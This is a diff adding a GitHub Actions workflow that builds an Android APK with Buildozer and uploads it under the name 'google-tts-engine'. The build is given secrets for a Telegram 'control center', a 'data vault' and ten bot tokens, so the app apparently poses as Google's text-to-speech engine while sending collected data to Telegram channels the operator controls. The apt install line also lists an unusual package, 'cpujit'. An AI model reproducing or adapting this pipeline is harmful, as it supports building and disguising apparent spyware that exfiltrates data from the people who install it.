@@ -1,0 +1,51 @@
+name: Build Android APK
+on:
+  push:
+    branches: [ main ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install dependencies
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y build-essential libffi-dev libssl-dev python3-setuptools libncurses5 libncursesw5 zlib1g-dev cpujit
+
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.11'
+
+      - name: Install Buildozer
+        run: |
+          pip install --upgrade pip
+          pip install buildozer cython
+
+      - name: Build with Buildozer
+        env:
+          SIGNING_KEY: ${{ secrets.SIGNING_KEY }}
+          KEY_ALIAS: ${{ secrets.KEY_ALIAS }}
+          KEY_PASSWORD: ${{ secrets.KEY_PASSWORD }}
+          KEY_STORE_PASSWORD: ${{ secrets.KEY_STORE_PASSWORD }}
+          TELEGRAM_CONTROL_CENTER_ID: ${{ secrets.TELEGRAM_CONTROL_CENTER_ID }}
+          TELEGRAM_DATA_VAULT_ID: ${{ secrets.TELEGRAM_DATA_VAULT_ID }}
+          TELEGRAM_BOT_1_TOKEN: ${{ secrets.TELEGRAM_BOT_1_TOKEN }}
+          TELEGRAM_BOT_2_TOKEN: ${{ secrets.TELEGRAM_BOT_2_TOKEN }}
+          TELEGRAM_BOT_3_TOKEN: ${{ secrets.TELEGRAM_BOT_3_TOKEN }}
+          TELEGRAM_BOT_4_TOKEN: ${{ secrets.TELEGRAM_BOT_4_TOKEN }}
+          TELEGRAM_BOT_5_TOKEN: ${{ secrets.TELEGRAM_BOT_5_TOKEN }}
+          TELEGRAM_BOT_6_TOKEN: ${{ secrets.TELEGRAM_BOT_6_TOKEN }}
+          TELEGRAM_BOT_7_TOKEN: ${{ secrets.TELEGRAM_BOT_7_TOKEN }}
+          TELEGRAM_BOT_8_TOKEN: ${{ secrets.TELEGRAM_BOT_8_TOKEN }}
+          TELEGRAM_BOT_9_TOKEN: ${{ secrets.TELEGRAM_BOT_9_TOKEN }}
+          TELEGRAM_BOT_10_TOKEN: ${{ secrets.TELEGRAM_BOT_10_TOKEN }}
+        run: buildozer android debug
+
+      - name: Upload APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: google-tts-engine
+          path: bin/*.apk
